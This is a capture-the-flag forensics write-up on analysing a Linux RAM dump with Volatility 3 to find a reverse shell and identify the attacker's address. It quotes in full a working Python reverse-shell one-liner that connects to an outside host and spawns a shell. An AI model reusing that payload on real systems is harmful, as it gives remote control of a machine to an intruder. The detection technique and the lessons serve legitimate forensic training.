# RAM Analysis - Linux - Network

- **Platform:** Root-Me Pro
- **Category:** Forensic
- **Difficulty:** Easy — 200 points
- **Step 1 task:** Identify the IP address and port used by the attacker (`ip:port`)

## Challenge
A Linux server showed abnormal network behaviour after an incident. Given a RAM
capture, determine whether the server's network behaviour was altered and
identify the suspicious communication.

## Approach
1. Unzipped `memory.zip` — it contained `memory.vmem` (2 GB raw), a `.vmsn`
   snapshot, and `linux.json`, a **pre-built Volatility 3 ISF symbol table** for
   the exact kernel (`vmlinux-6.12.63+deb13-amd64`, Debian 13). No need to build
   symbols manually — just point vol at the directory with `-s`.
2. Listed IP sockets:
   ```
   vol -q -s files/memory -f files/memory/memory.vmem linux.sockstat | grep AF_INET
   ```
3. One connection stood out immediately — a `python3` process (PID 1859) whose
   **file descriptors 0, 1 and 2 (stdin/stdout/stderr) all mapped to the same
   TCP socket**. That is the defining signature of a reverse shell.
4. Pulled the process arguments to confirm:
   ```
   vol -q -s files/memory -f files/memory/memory.vmem linux.psaux
   ```

## Vulnerability / Attack
An interactive SSH login as user `martin` (from `192.168.254.1`) led to a bash
shell that launched a Python reverse shell dialling out to the attacker's C2:

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("163.172.71.54",9740));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Process tree:
```
sshd(913) -> sshd-session martin(1153/1175) -> bash(1176) -> python3 reverse shell(1859) -> sh(1860)
```

Socket state (`linux.sockstat`):
```
python3  1859  TCP  192.168.254.152:43132  ->  163.172.71.54:9740  ESTABLISHED
```

## Solution / Flag
The attacker's IP and port (the C2 the reverse shell connects to):

```
163.172.71.54:9740
```

## Lesson
- When a memory dump ships with a `linux.json`, it's the ISF symbol file — feed
  it via `-s <dir>` and skip the whole banner/kernel-fingerprint step.
- **Reverse-shell tell in `linux.sockstat`:** a single process holding one socket
  across FDs 0/1/2 (and often 3) is `dup2`-ing its I/O onto the network — an
  interactive backdoor, not a normal client.
- `linux.psaux` gives the full argv, which for a `python3 -c` one-liner reveals
  the entire payload including the hard-coded attacker address.
